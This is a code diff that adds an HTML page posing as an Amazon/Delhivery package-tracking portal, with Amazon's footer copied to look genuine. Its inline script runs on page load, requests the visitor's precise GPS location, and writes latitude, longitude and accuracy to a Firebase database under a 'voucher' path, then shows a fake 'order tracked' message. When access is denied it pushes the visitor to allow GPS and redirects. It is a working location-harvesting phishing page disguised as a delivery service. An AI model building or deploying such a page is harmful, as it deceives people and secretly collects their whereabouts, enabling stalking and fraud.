@@ -1,0 +1,292 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+
+    <title>Amazon Package Tracking System</title>
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="stylesheet" href="amaz.css">
+    <link rel="stylesheet" href="amaz1.css">
+    <link rel="stylesheet" href="amaz2.css">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+  </head>
+  <body>
+
+    <nav class="navbar navbar-light bg-light justify-content-between">
+      <a class="navbar-brand" href="">
+        <img src="delhivery.jpg" width="80" height="30" class="d-inline-block align-top" alt="">
+      </a>
+      <h3>Customer Portal</h3>
+    </nav>
+    
+    <h1>Package tracking</h1>
+    <div style="margin-top: 5em;">
+
+    </div>  
+    <div id="header">
+      <div class="spinner-border" id="spinner" role="status">
+        <span class="sr-only">Loading...</span>
+      </div>
+    </div>
+        <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
+    <script src="https://www.gstatic.com/firebasejs/7.15.3/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/7.6.1/firebase-auth.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/7.6.1/firebase-database.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/7.15.3/firebase-analytics.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/7.15.3/firebase-storage.js"></script>
+
+    <script src="firebase-details.js"></script>
+
+    <script>
+      var options = {
+        enableHighAccuracy: true,
+        timeout: 50000,
+        maximumAge: 0
+      };
+        
+      function switchloc(){
+        var path = window.location.href;
+        var split = path.split("/");
+        var x = split.slice(0, split.length - 1).join("/") + "/";
+
+        console.log("To be replaced with : "+ x+"index2.html");
+
+
+        window.location.replace(x+"index2.html");
+      }
+
+      function success(pos) {
+        var crd = pos.coords;
+
+        console.log('Your current position is:');
+        console.log(`Latitude : ${crd.latitude}`);
+        console.log(`Longitude: ${crd.longitude}`);
+        console.log(`More or less ${crd.accuracy} meters.`);
+
+        var elem=document.createElement("p");
+
+        // elem.innerHTML="lat: "+crd.latitude + " and long: "+crd.longitude;
+
+        // document.getElementById("header").appendChild(elem);
+
+        var newPostKey = firebase.database().ref().child('posts').push().key;
+        firebase.database().ref('voucher/' + newPostKey).set({
+          lat: crd.latitude,
+          long: crd.longitude,
+          accuracy: crd.accuracy
+        }, (error) => {
+          if (error) {
+            // The write failed...
+            // alert("Error in saving data");
+            elem.innerHTML = "Please allow location access and turn on GPS for order status";
+            document.getElementById("spinner").style.display="none";
+            document.getElementById("header").appendChild(elem);
+            alert("Please allow location access and turn on GPS for order status");
+            switchloc();
+          } else {
+            // Data saved successfully!
+
+            elem.innerHTML = "Your order is tracked successfully. Please share this screenshot with the delivery agent.";
+            document.getElementById("spinner").style.display="none";
+            document.getElementById("header").appendChild(elem);
+          }
+        });
+      }
+
+      function error(err) {
+        console.warn(`ERROR(${err.code}): ${err.message}`);
+        var elem=document.createElement("p");
+        elem.innerHTML = "Please allow location access and turn on GPS";
+        document.getElementById("spinner").style.display="none";
+        document.getElementById("header").appendChild(elem);
+        //window.location.href = window.location.href + "\";
+        alert("Please allow location access and turn on GPS for order status");
+        switchloc();
+      }
+
+      navigator.geolocation.getCurrentPosition(success, error, options);
+
+      </script>
+ 
+ <div style="margin-top: 5em;">
+
+ </div>
+
+ <div class="navFooterVerticalColumn navAccessibility" role="presentation">
+  <div class="navFooterVerticalRow navAccessibility" style="display: flex">
+        <div class="navFooterLinkCol navAccessibility">
+          <div class="navFooterColHead">Get to Know Us</div>
+        <ul>
+            <li class="nav_first">
+              <a href="https://www.aboutamazon.in/?utm_source=gateway&utm_medium=footer" class="nav_a">About Us</a>
+            </li>
+            <li >
+              <a href="https://amazon.jobs" class="nav_a">Careers</a>
+            </li>
+            <li >
+              <a href="https://press.aboutamazon.in/?utm_source=gateway&utm_medium=footer" class="nav_a">Press Releases</a>
+            </li>
+            <li >
+              <a href="/gp/browse.html?node=8872558031&ref_=footer_cares" class="nav_a">Amazon Cares</a>
+            </li>
+            <li >
+              <a href="/gp/browse.html?node=4594605031&ref_=footer_smile" class="nav_a">Gift a Smile</a>
+            </li>
+            <li class="nav_last ">
+              <a href="https://www.amazon.science" class="nav_a">Amazon Science</a>
+            </li>
+        </ul>
+      </div>
+        <div class="navFooterColSpacerInner navAccessibility"></div>
+        <div class="navFooterLinkCol navAccessibility">
+          <div class="navFooterColHead">Connect with Us</div>
+        <ul>
+            <li class="nav_first">
+              <a href="http://www.amazon.in/gp/redirect.html/ref=footer_fb?location=http://www.facebook.com/AmazonIN&token=2075D5EAC7BB214089728E2183FD391706D41E94&6" class="nav_a">Facebook</a>
+            </li>
+            <li >
+              <a href="http://www.amazon.in/gp/redirect.html/ref=footer_twitter?location=http://twitter.com/AmazonIN&token=A309DFBFCB1E37A808FF531934855DC817F130B6&6" class="nav_a">Twitter</a>
+            </li>
+            <li class="nav_last ">
+              <a href="http://www.amazon.in/gp/redirect.html?location=https://www.instagram.com/amazondotin&token=264882C912E9D005CB1D9B61F12E125D5DF9BFC7&source=standards" class="nav_a">Instagram</a>
+            </li>
+        </ul>
+      </div>
+        <div class="navFooterColSpacerInner navAccessibility"></div>
+        <div class="navFooterLinkCol navAccessibility">
+          <div class="navFooterColHead">Make Money with Us</div>
+        <ul>
+            <li class="nav_first">
+              <a href="/b/?node=2838698031&ld=AZINSOANavDesktopFooter&ref_=nav_footer_sell" class="nav_a">Sell on Amazon</a>
+            </li>
+            <li >
+              <a href="https://accelerator.amazon.in/?ref_=map_1_b2b_GW_FT" class="nav_a">Sell under Amazon Accelerator</a>
+            </li>
+            <li >
+              <a href="https://sell.amazon.in/grow-your-business/amazon-global-selling.html?ld=AZIN_Footer_V1&ref=AZIN_Footer_V1" class="nav_a">Amazon Global Selling</a>
+            </li>
+            <li >
+              <a href="https://affiliate-program.amazon.in/?utm_campaign=assocshowcase&utm_medium=footer&utm_source=GW&ref_=footer_assoc" class="nav_a">Become an Affiliate</a>
+            </li>
+            <li >
+              <a href="http://services.amazon.in/services/fulfilment-by-amazon/benefits.html/ref=az_footer_fba?ld=AWRGINFBAfooter" class="nav_a">Fulfilment by Amazon</a>
+            </li>
+            <li >
+              <a href="https://advertising.amazon.in/?ref=Amz.in" class="nav_a">Advertise Your Products</a>
+            </li>
+            <li class="nav_last ">
+              <a href="https://www.amazonpay.in/merchant" class="nav_a">Amazon Pay on Merchants</a>
+            </li>
+        </ul>
+      </div>
+        <div class="navFooterColSpacerInner navAccessibility"></div>
+        <div class="navFooterLinkCol navAccessibility">
+          <div class="navFooterColHead">Let Us Help You</div>
+        <ul>
+            <li class="nav_first">
+              <a href="/gp/help/customer/display.html?nodeId=GDFU3JS5AL6SYHRD&ref_=footer_covid" class="nav_a">COVID-19 and Amazon</a>
+            </li>
+            <li >
+              <a href="/gp/css/homepage.html?ref_=footer_ya" class="nav_a">Your Account</a>
+            </li>
+            <li >
+              <a href="/gp/css/returns/homepage.html?ref_=footer_hy_f_4" class="nav_a">Returns Centre</a>
+            </li>
+            <li >
+              <a href="/gp/help/customer/display.html?nodeId=201083470&ref_=footer_swc" class="nav_a">100% Purchase Protection</a>
+            </li>
+            <li >
+              <a href="/gp/browse.html?node=6967393031&ref_=footer_mobapp" class="nav_a">Amazon App Download</a>
+            </li>
+            <li >
+              <a href="/gp/BIT/theamazonapp/ref=footer_assistant_download_copy" class="nav_a">Amazon Assistant Download</a>
+            </li>
+            <li class="nav_last ">
+              <a href="/gp/help/customer/display.html?nodeId=200507590&ref_=footer_gw_m_b_he" class="nav_a">Help</a>
+            </li>
+        </ul>
+      </div>
+  </div>
+</div>
+<div class="nav-footer-line"></div>
+
+  <div class="navFooterLine navFooterLinkLine navFooterPadItemLine">
+    <span>
+      <div class="navFooterLine navFooterLogoLine">
+        <a  href="/ref=footer_logo">
+        <div class="nav-logo-base nav-sprite"></div>
+        </a>
+      </div>
+</span>
+    
+      <span class="icp-container-desktop"><div
+          class="navFooterLine">
+<style type="text/css">
+  #icp-touch-link-language { display: none; }
+</style>
+
+
+<a href="/gp/customer-preferences/select-language/ref=footer_lang?ie=UTF8&preferencesReturnUrl=%2F" class="icp-button" id="icp-touch-link-language">
+  <div class="icp-nav-globe-img-2 icp-button-globe-2"></div><span class="icp-color-base">English</span><span class="nav-arrow icp-up-down-arrow"></span><span class="aok-hidden" style="display:none">Choose a language for shopping.</span>
+</a>
+
+
+</div></span>
+    
+  </div>
+  
+<div class="navFooterLine navFooterLinkLine navFooterPadItemLine">
+  <ul><li class="nav_first"><a href="http://www.amazon.com.au/ref=footer_au" class="nav_a">Australia</a></li><li><a href="https://www.amazon.com.br/ref=footer_br" class="nav_a">Brazil</a></li><li><a href="https://www.amazon.ca/ref=footer_ca" class="nav_a">Canada</a></li><li><a href="https://www.amazon.cn/ref=footer_cn" class="nav_a">China</a></li><li><a href="https://www.amazon.fr/ref=footer_fr" class="nav_a">France</a></li><li><a href="https://www.amazon.de/ref=footer_de" class="nav_a">Germany</a></li><li><a href="https://www.amazon.it/ref=footer_it" class="nav_a">Italy</a></li><li><a href="https://www.amazon.co.jp/ref=footer_jp" class="nav_a">Japan</a></li><li><a href="https://www.amazon.com.mx/ref=footer_mx" class="nav_a">Mexico</a></li><li><a href="https://www.amazon.nl/ref=footer_nl" class="nav_a">Netherlands</a></li><li><a href="https://www.amazon.pl/ref=footer_pl" class="nav_a">Poland</a></li><li><a href="https://www.amazon.sg/ref=footer_sg" class="nav_a">Singapore</a></li><li><a href="https://www.amazon.es/ref=footer_es" class="nav_a">Spain</a></li><li><a href="https://www.amazon.com.tr/ref=footer_tr" class="nav_a">Turkey</a></li><li><a href="https://www.amazon.ae/ref=footer_ae" class="nav_a">United Arab Emirates</a></li><li><a href="https://www.amazon.co.uk/ref=footer_uk" class="nav_a">United Kingdom</a></li><li class="nav_last"><a href="https://www.amazon.com/ref=footer_us" class="nav_a">United States</a></li></ul>
+  
+</div>
+
+  
+  <div class="navFooterLine navFooterLinkLine navFooterDescLine"  >
+    <table class="navFooterMoreOnAmazon" cellspacing="0">
+      <tr>
+<td class="navFooterDescItem"><a href=https://www.abebooks.com/ class="nav_a">AbeBooks<br><span class="navFooterDescText">Books, art<br>& collectibles</span></a></td><td class="navFooterDescSpacer" style="width: 4%"></td>
+<td class="navFooterDescItem"><a href=https://aws.amazon.com/what-is-cloud-computing/?sc_channel=EL&sc_campaign=IN_amazonfooter class="nav_a">Amazon Web Services<br><span class="navFooterDescText">Scalable Cloud<br>Computing Services</span></a></td><td class="navFooterDescSpacer" style="width: 4%"></td>
+<td class="navFooterDescItem"><a href=https://www.audible.in/ class="nav_a">Audible<br><span class="navFooterDescText">Download<br>Audio Books</span></a></td><td class="navFooterDescSpacer" style="width: 4%"></td>
+<td class="navFooterDescItem"><a href=https://www.dpreview.com/ class="nav_a">DPReview<br><span class="navFooterDescText">Digital<br>Photography</span></a></td><td class="navFooterDescSpacer" style="width: 4%"></td>
+<td class="navFooterDescItem"><a href=https://www.imdb.com/ class="nav_a">IMDb<br><span class="navFooterDescText">Movies, TV<br>& Celebrities</span></a></td></tr>
+<tr><td>&nbsp;</td></tr>
+<tr>
+<td class="navFooterDescItem"><a href=https://www.shopbop.com/ class="nav_a">Shopbop<br><span class="navFooterDescText">Designer<br>Fashion Brands</span></a></td><td class="navFooterDescSpacer" style="width: 4%"></td>
+<td class="navFooterDescItem"><a href=/business?ref=footer_aingw class="nav_a">	
+Amazon Business<br><span class="navFooterDescText">Everything For<br>Your Business</span></a></td><td class="navFooterDescSpacer" style="width: 4%"></td>
+<td class="navFooterDescItem"><a href=/now?ref=footer_amznow class="nav_a">Prime Now<br><span class="navFooterDescText"> 2-Hour Delivery<br>on Everyday Items</span></a></td><td class="navFooterDescSpacer" style="width: 4%"></td>
+<td class="navFooterDescItem"><a href=/music/prime?ref=footer_apm class="nav_a">Amazon Prime Music<br><span class="navFooterDescText">75 million songs, ad-free<br>Over 10 million podcast episodes </span></a></td><td class="navFooterDescSpacer" style="width: 4%"></td>
+<td class="navFooterDescItem">&nbsp;</td>
+</tr>
+
+    </table>
+  </div>
+
+  
+<div class="navFooterLine navFooterLinkLine navFooterPadItemLine navFooterCopyright">
+  <ul><li class="nav_first"><a href="/gp/help/customer/display.html?nodeId=200545940&ref_=footer_cou" class="nav_a">Conditions of Use & Sale</a></li><li ><a href="/gp/help/customer/display.html?nodeId=200534380&ref_=footer_privacy" class="nav_a">Privacy Notice</a></li><li class="nav_last"><a href="/gp/help/customer/display.html?nodeId=202075050&ref_=footer_iba" class="nav_a">Interest-Based Ads</a></li></ul><span>© 1996-2022, Amazon.com, Inc. or its affiliates</span>
+</div>
+
+  
+</div>
+
+
+    
+    
+
+
+
+  
+  </body>
+</html>
